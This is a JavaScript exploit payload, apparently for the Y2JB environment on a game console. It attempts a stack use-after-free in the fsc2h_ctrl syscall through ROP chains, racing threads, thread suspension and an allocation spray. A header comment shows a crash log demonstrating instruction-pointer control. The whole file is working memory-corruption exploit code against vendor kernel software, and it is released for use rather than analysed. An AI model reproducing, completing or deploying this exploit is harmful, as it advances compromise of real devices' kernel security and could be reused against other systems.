/*
    Copyright (C) 2025 MeisterLone
    
    `no_ctrl.js` uses techniques demonstrated by the lapse implementations of Y2JB and PSFree

    Source:
	https://github.com/Gezine/Y2JB
    https://github.com/Al-Azif/psfree-lapse/tree/v1.5.0
	https://hackerone.com/reports/2900606
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
	
	
	Notes:
	This is a payload for v1.2 Y2JB It will simply crash in its current state, nothing useful. 
	However at this point it does demonstrate UAF and RIP control around ~10-20% of runs in ideal conditions. 
	Sometimes a reboot increased hit rate.
	
	from klog			#
						# A user thread receives a fatal signal
						#
						# signal: 11 (SIGSEGV)
						# thread ID: 101214
						# thread name:
						# proc ID: 153
						# proc name: eboot.bin
						# reason: page fault (user read instruction, protection violation)
						# fault address: 0000000282641860
						#
						# registers:
						# rax: 0000000000000000  rbx: 0000000000000000
						# rcx: 0000000000000016  rdx: ffffffffffffffff
						# rsi: 0000000000000000  rdi: 00000002826415e0
						# rbp: 0000000000000000  rsp: 00000002826418d8
						# r8 : 0000000000000000  r9 : 0000000000000000
						# r10: 000000000515ca11  r11: 0000000000000246
						# r12: 0000000000000000  r13: 0000000000000000
						# r14: 0000000000000000  r15: 0000000000000000
	 rip control!	->	# rip: 0000000282641860  eflags: 00010246
						# lbf: 0000000838510b4e  lbt: 0000000282641860
						# lb0: ffffffffffffffff  lb1: ffffffffffffffff
						# lb2: 0000000282641860  lb3: 0000000838510b4c
						# lb4: ffffffffffffffff  lb5: ffffffffffffffff
						# lb6: ffffffffffffffff  lb7: ffffffffffffffff
						#

						## Our spray allocations will reliably contain 0x00000002826417c0 (rip-0x0a)
	
*/

(async function() {
    try {
        await log("fsc2h_ctrl stack UAF exploit");
        
        // Syscalls
        SYSCALL.fsc2h_ctrl = 0x2c4n;
        SYSCALL.thr_new = 0x1c7n;
        SYSCALL.thr_exit = 0x1afn;
        SYSCALL.nanosleep = 0xf0n;
        SYSCALL.cpuset_setaffinity = 0x1e8n;
        SYSCALL.rtprio_thread = 0x1d2n;
        SYSCALL.sched_yield = 0x14bn;
        SYSCALL.thr_suspend_ucontext = 0x278n;
        SYSCALL.thr_resume_ucontext = 0x279n;
        SYSCALL.socketpair = 0x87n;
        SYSCALL.read = 0x3n;
        SYSCALL.write = 0x4n;
        
        // Socket constants
        const AF_UNIX = 1n;
        const SOCK_STREAM = 1n;

        // Commands
        const CMD_WAIT = 0x10001n;
        const CMD_RESOLVE = 0x20005n;
        const CMD_COMPLETE = 0x20003n;

        // CPU and priority settings
        const MAIN_CORE = 4;
        const PRI_REALTIME = 2;
        const MAIN_RTPRIO = 0x100;
        
        // Stack frame sizing
        const STACK_FRAME_SIZE = 0xa0;
        const INPUT_SIZE_FOR_STACK = STACK_FRAME_SIZE - 0x18;

        // Signals and synchronization
        let ready_signal = malloc(8);
        let thread3_ready = malloc(8);
        let thread3_sleeping = malloc(8);
        let thread2_freed = malloc(8);
        let thread3_returned = malloc(8);
        let deletion_signal = malloc(8);
        let thread3_stack_addr = malloc(8);
        let pipe_buf = malloc(8);
        
        // CRITICAL: Global variables required for call_suspend_chain
        let saved_fp = 0n;
        let return_value_buf = new BigUint64Array(1);
        let return_value_addr = get_backing_store(return_value_buf);  // MUST link to buffer!
        let rop_chain = new BigUint64Array(100);
        let fake_frame = malloc(0x100);
        
        // Threading setup
        let setjmp_addr = libc_base + 0x58F80n;
        let longjmp_addr = libc_base + 0x58FD0n;
        
        const jmpbuf = malloc(0x60);
        call(setjmp_addr, jmpbuf);
        const saved_fpu_ctrl = Number(read32(jmpbuf + 0x40n));
        const saved_mxcsr = Number(read32(jmpbuf + 0x44n));

        // Lapse's thread suspension chain
        function call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid) {
            let rop_i = 0;
            
            // Ensure all parameters are BigInt
            pipe_write_fd = BigInt(pipe_write_fd);
            pipe_buf = BigInt(pipe_buf);
            thr_tid = BigInt(thr_tid);
            
            // Write to pipe to unblock thread
            rop_chain[rop_i++] = ROP.pop_rax;
            rop_chain[rop_i++] = SYSCALL.write;
            rop_chain[rop_i++] = ROP.pop_rdi;
            rop_chain[rop_i++] = pipe_write_fd;
            rop_chain[rop_i++] = ROP.pop_rsi;
            rop_chain[rop_i++] = pipe_buf;
            rop_chain[rop_i++] = ROP.pop_rdx;
            rop_chain[rop_i++] = 1n;
            rop_chain[rop_i++] = syscall_wrapper;
            
            // Yield to let thread run (no parameters)
            rop_chain[rop_i++] = ROP.pop_rax;
            rop_chain[rop_i++] = SYSCALL.sched_yield;
            rop_chain[rop_i++] = ROP.pop_rdi;
            rop_chain[rop_i++] = 0n;
            rop_chain[rop_i++] = syscall_wrapper;
            
            // Suspend the thread!
            // thr_suspend_ucontext(long id) - single parameter
            rop_chain[rop_i++] = ROP.pop_rax;
            rop_chain[rop_i++] = SYSCALL.thr_suspend_ucontext;
            rop_chain[rop_i++] = ROP.pop_rdi;
            rop_chain[rop_i++] = thr_tid;
            rop_chain[rop_i++] = ROP.pop_rsi;
            rop_chain[rop_i++] = 0n;  // NULL ucontext (if needed)
            rop_chain[rop_i++] = syscall_wrapper;
            
            // Return result
            rop_chain[rop_i++] = ROP.pop_rdi;
            rop_chain[rop_i++] = return_value_addr;
            rop_chain[rop_i++] = ROP.mov_qword_rdi_rax;
            
            rop_chain[rop_i++] = ROP.mov_rax_0x200000000;
            rop_chain[rop_i++] = ROP.pop_rbp;
            rop_chain[rop_i++] = saved_fp;
            rop_chain[rop_i++] = ROP.mov_rsp_rbp;
            
            return pwn(fake_frame);
        }

        function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            saved_fp = addrof(call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n);
            call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid);
            
            return return_value_buf[0];
        }

        async function pin_main_thread_to_cpu4() {
            const cpu_mask = malloc(0x10);
            write16(cpu_mask, BigInt(1 << MAIN_CORE));
            
            const affinity_result = syscall(SYSCALL.cpuset_setaffinity, 
                                           3n, 1n, -1n, 0x10n, cpu_mask);
            
            const rtprio_buf = malloc(4);
            write16(rtprio_buf, BigInt(PRI_REALTIME));
            write16(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));
            
            const prio_result = syscall(SYSCALL.rtprio_thread, 1n, 0n, rtprio_buf);
        }

        function spawn_thread(rop_chain_array) {
            const rop_chain_addr = get_backing_store(rop_chain_array);
            
            const jmpbuf = malloc(0x60);
            write64(jmpbuf + 0x00n, ROP.ret);
            write64(jmpbuf + 0x10n, rop_chain_addr);
            write32(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));
            write32(jmpbuf + 0x44n, BigInt(saved_mxcsr));
            
            const thr_new_args = malloc(0x80);
            const tid_addr = malloc(0x8);
            const cpid = malloc(0x8);
            const stack = malloc(0x400);
            const tls = malloc(0x40);
            
            write64(thr_new_args + 0x00n, longjmp_addr);
            write64(thr_new_args + 0x08n, jmpbuf);
            write64(thr_new_args + 0x10n, stack);
            write64(thr_new_args + 0x18n, 0x400n);
            write64(thr_new_args + 0x20n, tls);
            write64(thr_new_args + 0x28n, 0x40n);
            write64(thr_new_args + 0x30n, tid_addr);
            write64(thr_new_args + 0x38n, cpid);
            
            const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
            if (result !== 0n) throw new Error("thr_new failed: " + result);
            
            return read64(tid_addr);
        }

        function wait_for(addr, value) {
            while (read64(addr) !== value) {
                nanosleep(1);
            }
        }

        function add_cpu_pinning_and_priority(rop_chain, rop_i) {
            const cpu_mask = malloc(0x10);
            write16(cpu_mask, BigInt(1 << MAIN_CORE));
            
            rop_chain[rop_i++] = ROP.pop_rax;
            rop_chain[rop_i++] = SYSCALL.cpuset_setaffinity;
            rop_chain[rop_i++] = ROP.pop_rdi;
            rop_chain[rop_i++] = 3n;
            rop_chain[rop_i++] = ROP.pop_rsi;
            rop_chain[rop_i++] = 1n;
            rop_chain[rop_i++] = ROP.pop_rdx;
            rop_chain[rop_i++] = -1n;
            rop_chain[rop_i++] = ROP.pop_rcx;
            rop_chain[rop_i++] = 0x10n;
            rop_chain[rop_i++] = ROP.pop_r8;
            rop_chain[rop_i++] = cpu_mask;
            rop_chain[rop_i++] = syscall_wrapper;

            const rtprio_buf = malloc(4);
            write16(rtprio_buf, BigInt(PRI_REALTIME));
            write16(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));

            rop_chain[rop_i++] = ROP.pop_rax;
            rop_chain[rop_i++] = SYSCALL.rtprio_thread;
            rop_chain[rop_i++] = ROP.pop_rdi;
            rop_chain[rop_i++] = 1n;
            rop_chain[rop_i++] = ROP.pop_rsi;
            rop_chain[rop_i++] = 0n;
            rop_chain[rop_i++] = ROP.pop_rdx;
            rop_chain[rop_i++] = rtprio_buf;
            rop_chain[rop_i++] = syscall_wrapper;

            return rop_i;
        }

        // Thread 1: Occupy slot 0
        function thread1() {
            const rop = new BigUint64Array(100);
            let i = 1;
            
            i = add_cpu_pinning_and_priority(rop, i);
            
            const resolve_in = malloc(0x18);
            write64(resolve_in, 0n);
            write64(resolve_in + 8n, 0n);
            write64(resolve_in + 16n, 0n);
            
            const resolve_out = malloc(0x28);
            
            rop[i++] = ROP.pop_rdi;
            rop[i++] = ready_signal;
            rop[i++] = ROP.pop_rax;
            rop[i++] = 1n;
            rop[i++] = ROP.mov_qword_rdi_rax;
            
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.fsc2h_ctrl;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = resolve_in;
            rop[i++] = ROP.pop_rsi;
            rop[i++] = 0x18n;
            rop[i++] = ROP.pop_rdx;
            rop[i++] = resolve_out;
            rop[i++] = ROP.pop_rcx;
            rop[i++] = 0x28n;
            rop[i++] = ROP.pop_r8;
            rop[i++] = CMD_WAIT;
            rop[i++] = syscall_wrapper;
            
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.thr_exit;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = 0n;
            rop[i++] = syscall_wrapper;
            
            return spawn_thread(rop);
        }

        // Thread 2: Free stack (with suspension support)
        function thread2_with_suspend(pipe_read_fd) {
            const rop = new BigUint64Array(100);
            let i = 1;
            
            i = add_cpu_pinning_and_priority(rop, i);
            
            // Wait for signal via pipe
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.read;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = pipe_read_fd;
            rop[i++] = ROP.pop_rsi;
            rop[i++] = pipe_buf;
            rop[i++] = ROP.pop_rdx;
            rop[i++] = 1n;
            rop[i++] = syscall_wrapper;
            
            // Now free the stack via CMD_WAIT
            const resolve_in = malloc(0x18);
            write64(resolve_in, 0n);
            write64(resolve_in + 8n, 0n);
            write64(resolve_in + 16n, 0n);
            
            const resolve_out = malloc(0x28);
            
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.fsc2h_ctrl;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = resolve_in;
            rop[i++] = ROP.pop_rsi;
            rop[i++] = 0x18n;
            rop[i++] = ROP.pop_rdx;
            rop[i++] = resolve_out;
            rop[i++] = ROP.pop_rcx;
            rop[i++] = 0x28n;
            rop[i++] = ROP.pop_r8;
            rop[i++] = CMD_WAIT;
            rop[i++] = syscall_wrapper;
            
            rop[i++] = ROP.pop_rdi;
            rop[i++] = thread2_freed;
            rop[i++] = ROP.pop_rax;
            rop[i++] = 1n;
            rop[i++] = ROP.mov_qword_rdi_rax;
            
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.thr_exit;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = 0n;
            rop[i++] = syscall_wrapper;
            
            return spawn_thread(rop);
        }

        // Thread 3: Store stack pointer (suspendable)
        function thread3_suspendable(pipe_read_fd, stack_addr_signal) {
            const rop = new BigUint64Array(200);
            let i = 1;
            
            i = add_cpu_pinning_and_priority(rop, i);
            
            // Signal ready
            rop[i++] = ROP.pop_rdi;
            rop[i++] = thread3_ready;
            rop[i++] = ROP.pop_rax;
            rop[i++] = 1n;
            rop[i++] = ROP.mov_qword_rdi_rax;
            
            // Block on pipe read - wait for main thread
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.read;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = pipe_read_fd;
            rop[i++] = ROP.pop_rsi;
            rop[i++] = pipe_buf;
            rop[i++] = ROP.pop_rdx;
            rop[i++] = 1n;
            rop[i++] = syscall_wrapper;
            
            // Signal we're about to call CMD_RESOLVE
            rop[i++] = ROP.pop_rdi;
            rop[i++] = thread3_sleeping;
            rop[i++] = ROP.pop_rax;
            rop[i++] = 1n;
            rop[i++] = ROP.mov_qword_rdi_rax;
            
            // CALL CMD_RESOLVE FIRST - This stores the stack pointer!
            const path_data = malloc(0x100);
            const resolve_in = malloc(0x18);
            write64(resolve_in, path_data);
            write64(resolve_in + 8n, 0x100n);
            write64(resolve_in + 16n, malloc(8));
            
            // Store the stack address so main thread can log it
            write64(stack_addr_signal, path_data);
            
            const resolve_out = malloc(0x28);
            write32(resolve_out, 0x10000n);
            
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.fsc2h_ctrl;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = resolve_in;
            rop[i++] = ROP.pop_rsi;
            rop[i++] = 0x18n;
            rop[i++] = ROP.pop_rdx;
            rop[i++] = resolve_out;
            rop[i++] = ROP.pop_rcx;
            rop[i++] = 0x28n;
            rop[i++] = ROP.pop_r8;
            rop[i++] = CMD_RESOLVE;
            rop[i++] = syscall_wrapper;
            
            // NOW ADD DELAY - Thread 3 will sleep AFTER storing stack pointer
            const delay = malloc(16);
            write64(delay, 1n);  // 1 second
            write64(delay + 8n, 0n);
            
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.nanosleep;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = delay;
            rop[i++] = ROP.pop_rsi;
            rop[i++] = 0n;
            rop[i++] = syscall_wrapper;
            
            // Signal deletion
            rop[i++] = ROP.pop_rdi;
            rop[i++] = deletion_signal;
            rop[i++] = ROP.pop_rax;
            rop[i++] = 1n;
            rop[i++] = ROP.mov_qword_rdi_rax;
            
            // Signal if we returned (stack not corrupted)
            rop[i++] = ROP.pop_rdi;
            rop[i++] = thread3_returned;
            rop[i++] = ROP.pop_rax;
            rop[i++] = 1n;
            rop[i++] = ROP.mov_qword_rdi_rax;
            
            rop[i++] = ROP.pop_rax;
            rop[i++] = SYSCALL.thr_exit;
            rop[i++] = ROP.pop_rdi;
            rop[i++] = 0n;
            rop[i++] = syscall_wrapper;
            
            return spawn_thread(rop);
        }

        // ==== MAIN ATTACK SEQUENCE WITH SUSPENSION ====
        
        await pin_main_thread_to_cpu4();

        await log("[setup] socketpairs");
        const sockpair1 = malloc(8);
        if (syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair1) !== 0n) {
            throw new Error("socketpair1 creation failed");
        }
        const pipe3_read = read32(sockpair1);
        const pipe3_write = read32(sockpair1 + 4n);

        // Create second socketpair for Thread 2
        const sockpair2 = malloc(8);
        if (syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair2) !== 0n) {
            throw new Error("socketpair2 creation failed");
        }
        const pipe2_read = read32(sockpair2);
        const pipe2_write = read32(sockpair2 + 4n);

        await log("[1] t1: occupy slot 0");
        const tid1 = thread1();
        wait_for(ready_signal, 1n);

        await log("[2] t3: spawn");
        const tid3 = thread3_suspendable(pipe3_read, thread3_stack_addr);
        wait_for(thread3_ready, 1n);
        const t3_stack = read64(thread3_stack_addr);
        await log("    tid: " + toHex(tid3) + ", stack: " + toHex(t3_stack));

        await log("[3] t2: spawn (blocked)");
        const tid2 = thread2_with_suspend(pipe2_read);

        await log("[4] trigger t3, suspend after CMD_RESOLVE");
        write8(pipe_buf, 1n);
        syscall(SYSCALL.write, BigInt(pipe3_write), pipe_buf, 1n);
        wait_for(thread3_sleeping, 1n);
        nanosleep(50000000);
        syscall(SYSCALL.sched_yield);
        
        let suspend_result = syscall(SYSCALL.thr_suspend_ucontext, tid3);
        await log("    suspend: " + toHex(suspend_result));

        await log("[5] trigger t2 to free stack");
        write8(pipe_buf, 1n);
        syscall(SYSCALL.write, pipe2_write, pipe_buf, 1n);
        wait_for(thread2_freed, 1n);

        await log("[6] spray");
        
        // Aggressive allocation spray
        const spray_sizes = [0x80, 0x88, 0x90, 0x98, 0xa0];
        let total_allocs = 0;
        const spray_addresses = [];  // Track all spray allocations
        
        for (let round = 0; round < 10; round++) {
            for (let input_size of spray_sizes) {
                const alloc_size = input_size + 0x18;
                
                for (let i = 0; i < 50; i++) {
                    const data = malloc(input_size);
                    spray_addresses.push(data);  // Record this allocation
                    
                    for (let j = 0; j < input_size; j += 8) {
                        write64(data + BigInt(j), 0xDEADBEEF00000000n | BigInt(round << 8 | i));
                    }
                    
                    const resolve_in = malloc(0x18);
                    write64(resolve_in, data);
                    write64(resolve_in + 8n, BigInt(input_size));
                    write64(resolve_in + 16n, 0n);
                    
                    const resolve_out = malloc(0x28);
                    write32(resolve_out, 0x10000n);
                    
                    try {
                        syscall(SYSCALL.fsc2h_ctrl, resolve_in, 0x18n, 
                               resolve_out, 0x28n, CMD_RESOLVE);
                        total_allocs++;
                    } catch(e) {
                        break;
                    }
                }
            }
            
            if (total_allocs % 500 === 0 && total_allocs > 0) {
                await log("    " + total_allocs);
            }
        }
        
        await log("    total: " + total_allocs);
        await log("");
        await log("t3 stack: " + toHex(t3_stack));
        let addr_list = "spray: ";
        for (let i = 0; i < spray_addresses.length; i++) {
            addr_list += toHex(spray_addresses[i]);
            if (i < spray_addresses.length - 1) addr_list += ",";
        }
        await log(addr_list);
        
        await log("[7] resume t3");
        const resume_result = syscall(SYSCALL.thr_resume_ucontext, tid3);
        await log("    resume: " + toHex(resume_result));

        await log("    waiting for t3 to return...");
        nanosleep(500000000);
        if (read64(thread3_returned) !== 1n) {
            await log("[8] t3 did not return (crash/hang)");
        }

        const complete_data = malloc(0x100);
        const complete_in = malloc(0x18);
        write64(complete_in, complete_data);
        write64(complete_in + 8n, 0x100n);
        write64(complete_in + 16n, 0n);
        syscall(SYSCALL.fsc2h_ctrl, complete_in, 0x18n, 0n, 0n, CMD_COMPLETE);

    } catch (e) {
        await log("Fatal error: " + e.message);
        await log(e.stack);
    }
})();